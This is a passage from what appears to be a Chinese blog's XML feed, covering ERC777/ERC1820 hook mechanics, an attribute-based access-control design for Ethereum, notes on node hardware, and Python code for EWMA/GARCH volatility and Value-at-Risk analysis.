<h3 id="钩子函数如何工作"><a href="#钩子函数如何工作" class="headerlink" title="钩子函数如何工作"></a>钩子函数如何工作</h3><p><img src="/2020/03/15/ERC777%E4%BB%8B%E7%BB%8D/1.png"></p>
<p>首先来了解一下 ERC1820， ERC1820是一个全局的合约，在以太坊链上有一个唯一的合约地址，它总是 <code>0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24</code>。</p>
<p>ERC1820 合约提过了两个主要接口：</p>
<ul>
<li><code>setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer)</code><br>用来设置地址（_addr）的接口（_interfaceHash 接口名称的 keccak256 ）由哪个合约实现（_implementer）。</li>
<li><code>getInterfaceImplementer(address _addr, bytes32 _interfaceHash) external view returns (address)</code><br>这个函数用来查询地址（_addr）的接口由哪个合约实现。</li>
</ul>
<p>ERC777 使用 <code>send</code> 转账时，会分别在持有者和接收者地址上使用 ERC1820 的 getInterfaceImplementer 函数进行查询，查看是否有对应的实现合约，ERC777 标准规范里预定了接口及函数名称，如果有实现则进行相应的调用。</p>
<p>ERC777 使用 <code>operatorSend</code> 转账时，可以通过参数<code>operatorData</code>携带操作者的信息，发送代币除了执行对应账户的余额加减和触发事件之外，还有<strong>额外的规定</strong>：</p>
<ol>
<li>如果持有者有通过 ERC1820 注册 <code>ERC777TokensSender</code> 实现接口，代币合约必须调用其 <code>tokensToSend</code> 钩子函数。</li>
<li>如果接收者有通过 ERC1820 注册 <code>ERC777TokensRecipient</code> 实现接口， 代币合约必须调用其 <code>tokensReceived</code> 钩子函数。</li>
<li>如果有 <code>tokensToSend</code> 钩子函数，必须在修改余额状态之前调用。</li>
<li>如果有 <code>tokensReceived</code> 钩子函数，必须在修改余额状态之后调用。</li>
<li>调用钩子函数及触发事件时，<code>data</code> 和 <code>operatorData</code>必须原样传递，因为 tokensToSend 和 tokensReceived 函数可能根据这个数据取消转账（触发 <code>revert</code>）。</li>
</ol>
<p><strong>从而保证了ERC777交易以及钩子函数的原子性。</strong></p>
<p>参考链接 ==&gt;</p>
<p><a href="https://eips.ethereum.org/EIPS/eip-777">https://eips.ethereum.org/EIPS/eip-777</a></p>
<p><a href="https://github.com/0xjac/ERC777">https://github.com/0xjac/ERC777</a></p>
<p><a href="https://docs.openzeppelin.com/contracts/2.x/erc777">https://docs.openzeppelin.com/contracts/2.x/erc777</a></p>
<p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts">https://github.com/OpenZeppelin/openzeppelin-contracts</a></p>
]]></content>
      <tags>
        <tag>Token</tag>
      </tags>
  </entry>
  <entry>
    <title>Ethereum中如何实现ACL</title>
    <url>/2019/08/26/Ethereum%E4%B8%AD%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0ACL/</url>
    <content><![CDATA[<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p>在供应链(金融)、个人履历以及各个行业应用中，ACL（Access Control List）是共同类的需求。</p>
<h3 id="写管理"><a href="#写管理" class="headerlink" title="写管理"></a>写管理</h3><p><a href="https://openzeppelin.org/">OpenZeppelin</a>，<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Roles.sol">Roles.sol</a> 可以使用，搭配 <a href="https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/token/ERC721/ERC721Mintable.sol">ERC721 合约</a> 使用，处理生成和销毁数字资产功效加倍。<a href="https://willzhuang.github.io/2019/07/24/%E5%85%B3%E4%BA%8Eethereum%E9%9A%90%E7%A7%81%E6%95%B0%E6%8D%AE%E7%9A%84%E7%8E%B0%E7%8A%B6/">但是数据写在区块链上之后，即使使用了 private 关键字也是可以被用户读取的。</a> </p>
<p>以上方法只实现了用户的 写权限控制，无法实现用户的读权限控制。</p>
<h3 id="读管理"><a href="#读管理" class="headerlink" title="读管理"></a>读管理</h3><p>思路简介：</p>
<p>a) 客户端 AES 加密原文（shared data）；b) 密文(encrypt(shared data))如果过大则存放于某云数据库，其他用户也可以访问到云数据库，也可以直接存放于ethereum 上，如 Tx 的 extraData 或者 state 中；c) 验证用户符合条件，如 role，policy或者address的要求时，data owner 将 encrypt 的秘钥经过用户（data user）的 pk 加密后， 通过 event 传递给到用户（data user）</p>
<p>详细参加：<a href="https://arxiv.org/pdf/1903.07009.pdf">Multi-Authority Attribute-Based Access Control with Smart Contract</a></p>
<p>以下是论文中的详细说明：</p>
<h4 id="Architecture"><a href="#Architecture" class="headerlink" title="Architecture"></a>Architecture</h4><p><img src="/2019/08/26/Ethereum%E4%B8%AD%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0ACL/architecture.png"></p>
<h4 id="System-target"><a href="#System-target" class="headerlink" title="System target"></a>System target</h4><p>Here we present a concrete example. Suppose an data owner in the Computer and Information Sciences Department at the University of Delaware specifies access policy W to be [UD, PhD Student, Gender#] for accessing encrypted research meeting notes, and we have student Alice’s attribute list SAlice = [UD, PhD Student, Female], and student Bob’s attribute list SBob = [UD, Master Student, Male]. As a result, Alice can access the corresponding encrypted research meeting notes, while Bob cannot because he is an Master student. Notice that the Gender# attribute indicates that either gender satisfies the access policy.</p>
<h4 id="Participants"><a href="#Participants" class="headerlink" title="Participants"></a>Participants</h4><p>• Data Owner (DO): A DO is an entity (e.g., person, organization, or process) who owns the data to be shared. A DO actively specifies access policies for the data it shares.</p>
<p>• Data User (DU): A DU is an entity who wants to access data shared by DOs. A DU actively seeks access authorizations from DOs.</p>
<p>• Shared Data (SD): An SD is a piece of data owned by a DO, and can be accessed passively by authorized DUs. </p>
<p>• Attribute Token (AT): An AT is a credential representing an attribute that a DU possesses. </p>
<p>• Attribute Authority (AA): An AA is a pre-verified and authorized node in Ethereum who issues ATs to qualified DUs who possess the corresponding attributes.</p>
<h4 id="Workflow-Timeflow"><a href="#Workflow-Timeflow" class="headerlink" title="Workflow / Timeflow"></a>Workflow / Timeflow</h4><p><img src="/2019/08/26/Ethereum%E4%B8%AD%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0ACL/workflow.png"></p>
]]></content>
      <tags>
        <tag>EIP</tag>
      </tags>
  </entry>
  <entry>
    <title>Ethereum-PoS-upgrade</title>
    <url>/2022/02/21/Ethereum-PoS-upgrade/</url>
    <content><![CDATA[<p>链接==&gt; <a href="https://ethereum.org/en/upgrades/">Ethereum upgrades (formerly ‘Eth2’) | ethereum.org</a></p>
<p>个人认为这可能是有史以来规模最大(应用数量，客户数量最多)的一次系统升级。其设计，方式，方法均值得好好学习。</p>
]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>Eth系节点安装</title>
    <url>/2024/08/12/Eth%E7%B3%BB%E8%8A%82%E7%82%B9%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="Ethereum"><a href="#Ethereum" class="headerlink" title="Ethereum"></a>Ethereum</h2><p>安装手册：<a href="https://github.com/eth-educators/eth-docker">https://github.com/eth-educators/eth-docker</a></p>
<ul>
<li>32 GiB of RAM - 16 GiB works but can be challenging depending on client mix</li>
<li>4 CPU cores</li>
<li>4TB <a href="https://gist.github.com/yorickdowne/f3a3e79a573bf35767cd002cc977b038">“mainstream” SSD</a> - TLC and DRAM.<br>如 GCP 示例：<br><img src="/2024/08/12/Eth%E7%B3%BB%E8%8A%82%E7%82%B9%E5%AE%89%E8%A3%85/1.png"><br>• <strong>8 vCPU</strong>: This means the virtual machine (VM) has 8 virtual Central Processing Units (vCPUs). A vCPU is a virtualized CPU that the VM uses to run processes. Each vCPU is a share of the physical CPU’s resources allocated to the VM.<br>• <strong>4 cores</strong>: This refers to the number of physical cores backing the virtual CPUs. In this case, the 8 vCPUs are mapped to 4 physical CPU cores. Typically, this implies that each physical core is hyper-threaded, meaning it can handle two threads simultaneously, effectively providing two vCPUs per core.</li>
</ul>
<p><img src="/2024/08/12/Eth%E7%B3%BB%E8%8A%82%E7%82%B9%E5%AE%89%E8%A3%85/2.png"></p>
<h2 id="Linea"><a href="#Linea" class="headerlink" title="Linea"></a>Linea</h2><p>安装手册：<a href="https://docs.linea.build/developers/guides/run-a-node/use-docker">https://docs.linea.build/developers/guides/run-a-node/use-docker</a></p>
<h2 id="Polygon"><a href="#Polygon" class="headerlink" title="Polygon"></a>Polygon</h2><p>安装手册：<a href="https://docs.polygon.technology/pos/how-to/full-node/full-node-docker/">https://docs.polygon.technology/pos/how-to/full-node/full-node-docker/</a></p>
]]></content>
      <tags>
        <tag>CBDC</tag>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>FMR-波动率</title>
    <url>/2022/11/21/FMR-%E6%B3%A2%E5%8A%A8%E7%8E%87/</url>
    <content><![CDATA[<p>金融资产价格包括股票，期货，期权，目前本人在思考加密货币的价格是否可以套用经典的金融风险模型，学习笔记汇报如下，<u>由于比较书写数学公式不便，本文只记录了关键说明和程序代码</u>。</p>
<h3 id="1-EWMA"><a href="#1-EWMA" class="headerlink" title="1. EWMA"></a>1. EWMA</h3><p>指数移动加权平均 - Exponentially  Weighted Moving Average, EWMA.</p>
<p>EWMA波动率迭代告诉我们，当前一天的波动率是前一天波动率的函数，这也提供了一种用过去波动率预测未来波动率的方法。这种方法，不需要保存过去所有的数值，而且计算量较小，因此在实际中广泛使用。</p>
<p>The ewm() function is used to provide exponential weighted functions. 指数加权功能。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating the series. Using the range() function, we create a series and set the index to shot.</span></span><br><span class="line">my_series=pd.Series(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>,<span class="number">5</span>), index=[x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;shot&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Printing the series</span></span><br><span class="line">print(my_series)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Using Series.ewm(). We calculate the exponential weight of elements in the series using the ewm() function and set the com and adjust parameters.</span></span><br><span class="line">print(my_series.ewm(com=<span class="number">0.5</span>, adjust=<span class="literal">True</span>).mean())</span><br></pre></td></tr></table></figure>

<p>其中，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Series.ewm(self, com=<span class="literal">None</span>, span=<span class="literal">None</span>, halflife=<span class="literal">None</span>, alpha=<span class="literal">None</span>, min_periods=<span class="number">0</span>, adjust=<span class="literal">True</span>, ignore_na=<span class="literal">False</span>, axis=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong><code>com</code></strong>: This represents the decay in terms of the center of mass, α=1/(1+com), for com≥0. 根据Center of Mass质心指定衰减。</p>
</li>
<li><p><strong><code>span</code></strong>: This represents the decay in terms of the span, α=2/(span+1), for span≥1. 根据跨度范围（例如，天数）指定衰减。</p>
</li>
<li><p><strong><code>halflife</code></strong>: This represents the decay in terms of the half-life, α=1−exp(log(0.5)/halflife), for halflife&gt;0. 根据半衰期指定衰减。</p>
</li>
<li><p><strong><code>alpha</code></strong>: This indicates smoothing factor α, 0&lt;α≤1. 衰减系数。</p>
</li>
<li><p><strong><code>min_periods</code></strong>: This represents the minimum number of observations needed to have a value in the window. The default value is <code>0</code>. </p>
</li>
<li><p><strong><code>adjust</code></strong>: This is divided by the decaying adjustment factor into the initial periods to consider the imbalance in the relative weightings (looking at the EWMA as a moving average). 计算权重的方式。</p>
</li>
<li><p><strong><code>ignore_na</code></strong>: This specifies that the missing values should be ignored when calculating weights. The default is <code>False</code>. 如何对待空值。</p>
</li>
<li><p><strong><code>axis</code></strong>: The default value is 0. It specifies the axis on which the function is to be performed. If the value is 0, the operation is performed across the rows. Otherwise, the operation is performed across the columns. 数轴。</p>
</li>
</ul>
<h3 id="2-自回归条件异方差模型ARCH"><a href="#2-自回归条件异方差模型ARCH" class="headerlink" title="2. 自回归条件异方差模型ARCH"></a>2. 自回归条件异方差模型ARCH</h3><p>EWMA与实际情况有不符合的地方，例如，股票收益的波动率是随着时间而变化的。异方差（heteroscedasticity）是指一系列的随机变量值的方差不同。这个模型以自回归方式，通过刻画随时间变异的条件方差，成功解决了时间序列的波动性问题。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas_datareader</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt </span><br><span class="line"><span class="keyword">from</span> arch <span class="keyword">import</span> arch_model</span><br><span class="line"><span class="comment"># sp500 price</span></span><br><span class="line">sp500 = pandas_datareader.data.DataReader([<span class="string">&#x27;sp500&#x27;</span>], data_source=<span class="string">&#x27;fred&#x27;</span>, start=<span class="string">&#x27;12-28-2009&#x27;</span>, end=<span class="string">&#x27;12-28-2020&#x27;</span>)</span><br><span class="line"><span class="comment"># daily log return</span></span><br><span class="line">log_return_daily = np.log(sp500 / sp500.shift(<span class="number">1</span>))</span><br><span class="line">log_return_daily.dropna(inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># ARCH(1) model</span></span><br><span class="line">arch=arch_model(y=log_return_daily,mean=<span class="string">&#x27;Constant&#x27;</span>,lags=<span class="number">0</span>,vol=<span class="string">&#x27;ARCH&#x27;</span>,p=<span class="number">1</span>,o=<span class="number">0</span>,q=<span class="number">0</span>,dist=<span class="string">&#x27;normal&#x27;</span>)</span><br><span class="line">archmodel=arch.fit()</span><br><span class="line">archmodel.summary()</span><br><span class="line">archmodel.plot()</span><br></pre></td></tr></table></figure>



<h3 id="3-广义自回归条件异方差模型GARCH"><a href="#3-广义自回归条件异方差模型GARCH" class="headerlink" title="3. 广义自回归条件异方差模型GARCH"></a>3. 广义自回归条件异方差模型GARCH</h3><p>GARCH是对ARCH建模的一种重要推广。其后，又有诸如NGARCH，IGARCH，EGARCH等一系列针对不同应用等衍生模型相继出现。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># GARCH(1,1) model</span></span><br><span class="line">garch=arch_model(y=log_return_daily,mean=<span class="string">&#x27;Constant&#x27;</span>,lags=<span class="number">0</span>,vol=<span class="string">&#x27;GARCH&#x27;</span>,p=<span class="number">1</span>,o=<span class="number">0</span>,q=<span class="number">1</span>,dist=<span class="string">&#x27;normal&#x27;</span>)</span><br><span class="line">garchmodel=garch.fit()</span><br><span class="line">garchmodel.summary()</span><br><span class="line">garchmodel.plot()</span><br></pre></td></tr></table></figure>



<h3 id="4-模型比较"><a href="#4-模型比较" class="headerlink" title="4.模型比较"></a>4.模型比较</h3><p>对于EWMA模型，利用了通常用的0.94，即 JP Morgan 的RiskMetrics采用的设定。所以，下图中，EWMA中的 λ 通常为 0.94。当GARCH(1, 1)模型的参数 β=0 时，即为ARCH(1, 1)模型。而当 ω=0，α=1-λ，β=λ 时，GARCH(1, 1)模型变换成为EWMA模型。</p>
<p><img src="/2022/11/21/FMR-%E6%B3%A2%E5%8A%A8%E7%8E%87/1.png"></p>
<h3 id="5-隐含波动率"><a href="#5-隐含波动率" class="headerlink" title="5.隐含波动率"></a>5.隐含波动率</h3><p>请参考相关阅读中的金融分享管理 - 视频 <a href="https://space.bilibili.com/513194466/channel/seriesdetail?sid=650176%E3%80%82">https://space.bilibili.com/513194466/channel/seriesdetail?sid=650176。</a></p>
<p><strong>疑问：市场波动率模型以布朗运动位基础，这真的符合市场的实际情况吗？特别是长期投资？如乔布斯，国家资本主义，等等。</strong></p>
<p>相关阅读：</p>
]]></content>
      <tags>
        <tag>金融</tag>
      </tags>
  </entry>
  <entry>
    <title>FMR-市场风险</title>
    <url>/2022/11/25/FMR-%E5%B8%82%E5%9C%BA%E9%A3%8E%E9%99%A9/</url>
    <content><![CDATA[<p>按照风险的驱动因素，金融风险可以分为市场风险market risk，信用风险credit risk，操作风险operational risk，流动性风险liquidity risk。</p>
<p>最常见的市场风险包括利率风险，汇率风险，通货膨胀风险，证券价格风险，波动率风险等。</p>
<p>市场风险分析方法：</p>
<ol>
<li><p>缺口分析法 gap analysis，即资产负债缺口分析法。当利率发生变化时，资产和负债之间产生“缺口”，通过比较缺口的大小，可以得到利率变化时市场价值变动的程度，亦即产生的<strong>利率风险</strong>的大小。GAP（缺口）= RSA（利率敏感性资产）- RSL（利率敏感性负债）</p>
</li>
<li><p>久期分析法 duration analysis，即持续期分析法或者期限弹性分析法。其通过对各时间段段缺口赋予相应权重，得到加权缺口，然后对这些加权缺口求和，以此估算<strong>利率</strong>变动对市场价值的影响。</p>
</li>
</ol>
<p>相对于缺口分析只是考虑净收入的变化，久期分析则考察资产或者负债的价值，是一种更为准确的利率风险计量方法。</p>
<ol start="3">
<li>场景分析法 scenario analysis，又称假设分析法 what-if analysis。通过设定不同的情景，分析在每一种情景下的收益或者亏损，从而对<strong>整个投资组合的未来风险情况进行评估</strong>，做出最佳决策。</li>
<li>投资组合理论 portfolio theory，是一种衡量<strong>市场风险</strong>的方法。</li>
<li>希腊字母估计市场风险。</li>
</ol>
<table>
<thead>
<tr>
<th>希腊字母</th>
<th>符号</th>
<th>风险评估</th>
</tr>
</thead>
<tbody><tr>
<td>Delta</td>
<td>Δ</td>
<td>标的资产价格变化引起金融衍生品价格变化</td>
</tr>
<tr>
<td>Gamma</td>
<td>Γ</td>
<td>标的资产价格变化引起Delta变化</td>
</tr>
<tr>
<td>Theta</td>
<td>Θ</td>
<td>时间引起衍生品价格变化</td>
</tr>
<tr>
<td>Vega</td>
<td>Λ</td>
<td>市场波动率变化引起金融衍生品价格变化</td>
</tr>
<tr>
<td>Rho</td>
<td>ρ</td>
<td>利率变化引起金融衍生品价格变化</td>
</tr>
</tbody></table>
<ol start="6">
<li><p>风险价值 Value at Risk - VaR，也叫在险价值。作为经典的市场风险度量，可以用来评估资产的风险，帮助金融机构合理分散或者规避风险。摩根大通J.P.Morgan Chase开源了RiskMetrics系统，很快被金融机构采用，<strong>广泛地用来计算包括市场风险、信用风险以及操作风险等在内的金融风险</strong>。</p>
<p>6.1 参数法计算风险价值 parametric approach，一般假设未来收益满足正态分布，这是因为如股票收益率等风险因子一般都可以用正态分布近似，而资产组合通常也可以用风险因子等线性组合来表示，并且正态分布的任意线性组合仍然为正态分布，因此资产祝贺的预期收益分布仍然为正态分布。</p>
<p>在市场上，价格低标准差通常变化较大，价格本身对于标准差来说，变化并不大。所以，<strong>参数法的关键是要计算出分布的标准差σ</strong>，正因为如此，参数法又时也被称为方差协方差方法。该原理容易理解，计算量也较小。</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> pandas_datareader</span><br><span class="line"><span class="keyword">import</span> scipy.stats <span class="keyword">as</span> stats</span><br><span class="line"><span class="keyword">from</span> mpl_toolkits <span class="keyword">import</span> mplot3d</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> cm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设投资组合包含以下公司</span></span><br><span class="line">tickers = [<span class="string">&#x27;GOOGL&#x27;</span>,<span class="string">&#x27;FB&#x27;</span>,<span class="string">&#x27;AAPL&#x27;</span>,<span class="string">&#x27;NFLX&#x27;</span>,<span class="string">&#x27;AMZN&#x27;</span>]</span><br><span class="line">ticker_num = <span class="built_in">len</span>(tickers)</span><br><span class="line">price_data = []</span><br><span class="line"><span class="keyword">for</span> ticker <span class="keyword">in</span> <span class="built_in">range</span>(ticker_num):</span><br><span class="line">    <span class="comment"># 获取股票的历史数据</span></span><br><span class="line">    prices = pandas_datareader.DataReader(tickers[ticker], start=<span class="string">&#x27;2015-11-30&#x27;</span>, end = <span class="string">&#x27;2020-11-30&#x27;</span>, data_source=<span class="string">&#x27;yahoo&#x27;</span>)   </span><br><span class="line">    price_data.append(prices[[<span class="string">&#x27;Adj Close&#x27;</span>]])</span><br><span class="line">    df_stocks = pd.concat(price_data, axis=<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># stock log returns计算“日对数回报率”</span></span><br><span class="line">logreturns = np.log(df_stocks/df_stocks.shift(<span class="number">1</span>))[<span class="number">1</span>:]  </span><br><span class="line">logreturns.columns = tickers </span><br><span class="line">logreturns.head() </span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设它们的对数回报率满足正态分布，下面代码计算并展示股票的回报率分布</span></span><br><span class="line"><span class="comment"># plot log return distribution for GOOGL</span></span><br><span class="line">plt.style.use(<span class="string">&#x27;ggplot&#x27;</span>)</span><br><span class="line">mu, std = stats.norm.fit(logreturns[<span class="string">&#x27;GOOGL&#x27;</span>])</span><br><span class="line">x = np.linspace(mu<span class="number">-5</span>*std, mu+<span class="number">5</span>*std, <span class="number">500</span>)</span><br><span class="line">logreturns[<span class="string">&#x27;GOOGL&#x27;</span>].hist(bins=<span class="number">60</span>, density=<span class="literal">True</span>, histtype=<span class="string">&quot;stepfilled&quot;</span>, alpha=<span class="number">0.5</span>)</span><br><span class="line">x = np.linspace(mu - <span class="number">3</span>*std, mu+<span class="number">3</span>*std, <span class="number">500</span>)</span><br><span class="line">plt.plot(x, stats.norm.pdf(x, mu, std))</span><br><span class="line">plt.title(<span class="string">&quot;Log return distribution for GOOGL&quot;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;Return&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;Density&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># plot log return distribution</span></span><br><span class="line">rows = <span class="number">2</span></span><br><span class="line">cols = <span class="number">2</span></span><br><span class="line">fig, axs = plt.subplots(rows, cols, figsize=(<span class="number">12</span>,<span class="number">6</span>))</span><br><span class="line">ticker_n = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">        mu, std = stats.norm.fit(logreturns[tickers[ticker_n]])</span><br><span class="line">        x = np.linspace(mu<span class="number">-5</span>*std, mu+<span class="number">5</span>*std, <span class="number">500</span>)</span><br><span class="line">        axs[i,j].hist(logreturns[tickers[ticker_n]], bins=<span class="number">60</span>, density=<span class="literal">True</span>, histtype=<span class="string">&quot;stepfilled&quot;</span>, alpha=<span class="number">0.5</span>)</span><br><span class="line">        axs[i,j].plot(x, stats.norm.pdf(x, mu, std))</span><br><span class="line">        axs[i,j].set_title(<span class="string">&quot;Log return distribution for &quot;</span>+tickers[ticker_n])</span><br><span class="line">        axs[i,j].set_xlabel(<span class="string">&quot;Return&quot;</span>)</span><br><span class="line">        axs[i,j].set_ylabel(<span class="string">&quot;Density&quot;</span>)</span><br><span class="line">        ticker_n = ticker_n + <span class="number">1</span></span><br><span class="line">plt.tight_layout()</span><br></pre></td></tr></table></figure>

<p>​    6.2 历史法计算风险价值 historical approach，这是一种全值估计方法 full revaluation，具体是指利用风险因子的历史数据，计算过去某段时期收益的频度分布，并以此来模拟风险因子的未来收益分布，然后根据置信水平，确定相应的最大可能损失。</p>
<p>​    6.3 蒙特卡洛法计算风险价值 Monte Carlo simulation，这也是风险价值计算中最常应用的模型之一。首先通过分析历史数据建立风险因子的随机过程模型，然后反复模拟风险因子变量的随机过程，每一次模拟都可以得到风险因子的一个未来变化的情景，以及投资组合在持有期期末的一个可能价值。通过大量的模拟，投资组合价值的模拟分布将最终收敛于该组合的真实分布，根据该分布，可以计算风险价值。</p>
<p><img src="/2022/11/25/FMR-%E5%B8%82%E5%9C%BA%E9%A3%8E%E9%99%A9/1.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> pandas_datareader</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设投资组合包含以下公司</span></span><br><span class="line">tickers = [<span class="string">&#x27;GOOGL&#x27;</span>,<span class="string">&#x27;FB&#x27;</span>,<span class="string">&#x27;AAPL&#x27;</span>,<span class="string">&#x27;NFLX&#x27;</span>,<span class="string">&#x27;AMZN&#x27;</span>]</span><br><span class="line">ticker_num = <span class="built_in">len</span>(tickers)</span><br><span class="line">price_data = []</span><br><span class="line"><span class="keyword">for</span> ticker <span class="keyword">in</span> <span class="built_in">range</span>(ticker_num):   </span><br><span class="line">    prices = pandas_datareader.DataReader(tickers[ticker], start=<span class="string">&#x27;2015-11-30&#x27;</span>, end = <span class="string">&#x27;2020-11-30&#x27;</span>, data_source=<span class="string">&#x27;yahoo&#x27;</span>)   </span><br><span class="line">    price_data.append(prices[[<span class="string">&#x27;Adj Close&#x27;</span>]])</span><br><span class="line">    df_stocks = pd.concat(price_data, axis=<span class="number">1</span>)</span><br><span class="line">df_stocks.columns = tickers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后计算股票的累积回报率</span></span><br><span class="line"><span class="comment"># cumulative returns</span></span><br><span class="line">stock_return = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ticker_num):  </span><br><span class="line">    return_tmp = np.log(df_stocks[[tickers[i]]]/df_stocks[[tickers[i]]].shift(<span class="number">1</span>))[<span class="number">1</span>:]  </span><br><span class="line">    return_tmp = (return_tmp+<span class="number">1</span>).cumprod()</span><br><span class="line">    stock_return.append(return_tmp[[tickers[i]]])</span><br><span class="line">    return_all = pd.concat(stock_return,axis=<span class="number">1</span>)</span><br><span class="line">return_all.head()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用曲线更直观地展示所有股票的回报率</span></span><br><span class="line"><span class="comment"># plot cumulative returns of all stocks</span></span><br><span class="line">plt.style.use(<span class="string">&#x27;ggplot&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i, col <span class="keyword">in</span> <span class="built_in">enumerate</span>(return_all.columns):</span><br><span class="line">    return_all[col].plot()</span><br><span class="line">plt.title(<span class="string">&#x27;Cumulative returns&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Date&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Return&#x27;</span>)</span><br><span class="line">plt.xticks(rotation=<span class="number">30</span>)</span><br><span class="line">plt.legend(return_all.columns)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设定投资组合中各个股票的比重，并且在持有期内保持不变。进而计算得到整个投资组合的预期回报和股价</span></span><br><span class="line"><span class="comment"># lastest return and price values</span></span><br><span class="line">latest_return = return_all.iloc[<span class="number">-1</span>,:]</span><br><span class="line">latest_price = df_stocks.iloc[<span class="number">-1</span>,:]</span><br><span class="line">sigma = latest_return.std()</span><br><span class="line"><span class="comment"># weights for stocks in the portfolio</span></span><br><span class="line">stock_weight = [<span class="number">0.2</span>, <span class="number">0.3</span>, <span class="number">0.1</span>, <span class="number">0.15</span>, <span class="number">0.25</span>] </span><br><span class="line"><span class="comment"># calculate expected return</span></span><br><span class="line">expected_return = latest_return.dot(stock_weight)</span><br><span class="line">print(<span class="string">&#x27;The weighted expected portfolio return: %.2f&#x27;</span> % expected_return)</span><br><span class="line"><span class="comment"># calculate weighted price</span></span><br><span class="line">price = latest_price.dot(stock_weight)</span><br><span class="line">print(<span class="string">&#x27;The weighted price of the portfolio: %.0f&#x27;</span> % price)</span><br><span class="line"></span><br><span class="line"><span class="comment">#假设该投资组合的回报率符合正态分布，以一天中的每一分钟作为步长，即分为1440个节点，利用蒙特卡洛模拟随机产生500个回报率数值。</span></span><br><span class="line"><span class="comment"># monte carlo simulation</span></span><br><span class="line">MC_num = <span class="number">500</span></span><br><span class="line">confidence_level = <span class="number">0.95</span></span><br><span class="line">time_step = <span class="number">1440</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(MC_num):  </span><br><span class="line">  daily_returns = np.random.normal(expected_return/time_step, sigma/np.sqrt(time_step), time_step)</span><br><span class="line">  plt.plot(daily_returns)</span><br><span class="line">plt.axhline(np.percentile(daily_returns,(<span class="number">1.0</span>-confidence_level)*<span class="number">100</span>), color=<span class="string">&#x27;r&#x27;</span>, linestyle=<span class="string">&#x27;dashed&#x27;</span>)</span><br><span class="line">plt.axhline(np.percentile(daily_returns,confidence_level*<span class="number">100</span>), color=<span class="string">&#x27;g&#x27;</span>, linestyle=<span class="string">&#x27;dashed&#x27;</span>)</span><br><span class="line">plt.axhline(np.mean(daily_returns), color=<span class="string">&#x27;b&#x27;</span>, linestyle=<span class="string">&#x27;solid&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Time&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Return&#x27;</span>)</span><br><span class="line"><span class="comment"># 可视化，红线处为风险价值</span></span><br><span class="line"><span class="comment"># plot return distribution</span></span><br><span class="line">sns.distplot(daily_returns, kde=<span class="literal">True</span>, color=<span class="string">&#x27;lightblue&#x27;</span>)</span><br><span class="line">plt.axvline(np.percentile(daily_returns,(<span class="number">1.0</span>-confidence_level)*<span class="number">100</span>), color=<span class="string">&#x27;red&#x27;</span>, linestyle=<span class="string">&#x27;dashed&#x27;</span>, linewidth=<span class="number">2</span>)</span><br><span class="line">plt.title(<span class="string">&quot;Return distribution&quot;</span>)</span><br><span 